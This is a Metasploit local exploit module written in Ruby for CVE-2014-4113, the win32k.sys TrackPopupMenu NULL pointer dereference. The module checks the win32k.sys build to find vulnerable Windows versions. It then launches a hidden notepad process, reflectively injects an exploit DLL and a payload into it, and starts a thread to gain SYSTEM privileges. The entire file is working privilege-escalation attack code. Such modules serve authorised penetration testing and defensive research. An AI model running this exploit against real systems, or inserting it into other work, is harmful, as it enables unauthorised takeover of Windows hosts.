##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Windows TrackPopupMenu Win32k NULL Pointer Dereference',
      'Description'    => %q{
        This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability
        can be triggered through the use of TrackPopupMenu. Under special conditions, the
        NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary
        code execution. This module has been tested successfully on Windows XP SP3, Windows
        2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows
        2008 R2 SP1 64 bits.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # vulnerability discovery and exploit in the wild
          'juan vazquez', # msf module (x86 target)
          'Spencer McIntyre' # msf module (x64 target)
        ],
      'Arch'           => [ ARCH_X86, ARCH_X86_64 ],
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Targets'        =>
        [
          # Tested on (32 bits):
          # * Windows XP SP3
          # * Windows 2003 SP2
          # * Windows 7 SP1
          # * Windows 2008
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          # Tested on (64 bits):
          # * Windows 7 SP1
          # * Windows 2008 R2 SP1
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'Payload'         =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'      =>
        [
          ['CVE', '2014-4113'],
          ['OSVDB', '113167'],
          ['BID', '70364'],
          ['MSB', 'MS14-058'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/']
        ],
      'DisclosureDate' => 'Oct 14 2014',
      'DefaultTarget'  => 0
    }))
  end

  def check
    os = sysinfo["OS"]

    if os !~ /windows/i
      return Exploit::CheckCode::Unknown
    end

    if sysinfo["Architecture"] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo["Architecture"] =~ /x86/i
      arch = ARCH_X86
    end

    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    # Neither target suports Windows 8 or 8.1
    return Exploit::CheckCode::Safe if build == 9200
    return Exploit::CheckCode::Safe if build == 9600

    if arch == ARCH_X86
      return Exploit::CheckCode::Detected if [2600, 3790, 7600, 7601].include?(build)
    else
      return Exploit::CheckCode::Detected if build == 7601
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo["Architecture"] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo["Architecture"] =~ /x86/ && target.arch.first == ARCH_X86_64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Launching notepad to host the exploit...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    if target.arch.first == ARCH_X86
      dll_file_name = 'cve-2014-4113.x86.dll'
    else
      dll_file_name = 'cve-2014-4113.x64.dll'
    end

    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4113', dll_file_name)
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

end